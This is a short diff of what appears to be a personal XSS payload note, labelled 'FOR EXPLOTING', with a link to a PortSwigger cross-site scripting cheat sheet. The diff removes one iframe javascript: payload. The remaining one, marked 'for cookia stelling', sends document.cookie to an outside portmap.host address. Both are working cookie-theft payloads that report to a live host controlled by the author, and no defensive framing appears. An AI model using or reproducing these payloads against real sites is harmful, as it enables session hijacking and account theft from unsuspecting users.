@@ -2,8 +2,6 @@
 |||||||||||||||||||||||||||||||||||||||||||||||||||||
 Cheat-sheet link : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onafterscriptexecute
 ||||||||||||||||||||||||FOR EXPLOTING|||||||||||||||||||||||||||||
-<iframe src="javascript:var i=' ' + document.cookie; alert(i); fetch('http://pip3lee101-64604.portmap.host:64604/?sam')">
-
 
 for cookia stelling
 <iframe src="javascript:let i=new Image;i.src='http://pip3lee101-64604.portmap.host:64604/?lee101='+document.cookie; console.log(document.cookie);" >
